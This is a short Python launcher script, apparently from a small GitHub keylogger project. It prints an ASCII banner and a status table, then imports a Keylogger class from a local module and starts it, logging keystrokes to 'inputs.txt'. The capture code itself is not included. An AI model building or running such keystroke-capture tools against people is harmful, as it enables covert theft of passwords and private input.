# -*- coding: utf-8 -*-
#!/usr/bin/env python3

from util import *

from keylogger import Keylogger

print("\n"+(" "*6)+colors.GREEN+"╋╋╋╋┏┓┏┓╋╋╋╋╋╋╋╋┏━┓")
print((" "*6)+"┏━┳┳┫┗┫┗┳━┳━┳┳━━┫━╋━┳┳┳┳┳┳━┓┏┳┳━┓")
print((" "*6)+"┃╋┃┃┃┏┫┃┃╋┃┃┃┣━━╋━┃╋┃┃┃┃┃┃╋┗┫┏┫┻┫")
print((" "*6)+"┃┏╋┓┣━┻┻┻━┻┻━┛╋╋┗━┫┏╋┓┣━━┻━━┻┛┗━┛")
print((" "*6)+"┗┛┗━┛╋╋╋╋╋╋╋╋╋╋╋╋╋┗┛┗━┛"+colors.ENDC)
print((" "*8)+colors.UNDERLINE+colors.HEADER+"https://github.com/p3titcr0c0\n"+colors.ENDC)

print("┌─────────────┬─────────────────────────┐")
print("│  "+colors.UNDERLINE+"Functions"+colors.ENDC+"  │           infos         │")
print("├─────────────┼─────────────────────────┤")
print("│  "+colors.OKGREEN+"Keylogger"+colors.ENDC+"  │          active         │")
print("├─────────────┤                         │")
print("│             │ write in ./'inputs.txt' │")
print("│             │                         │")
print("├─────────────┼─────────────────────────┤")
print("│   "+colors.OKGREEN+"Other"+colors.ENDC+"     │         inactive        │")
print("├─────────────┤                         │")
print("│             │                         │")
print("│             │                         │")
print("└─────────────┴─────────────────────────┘")

key = Keylogger()
key.start()
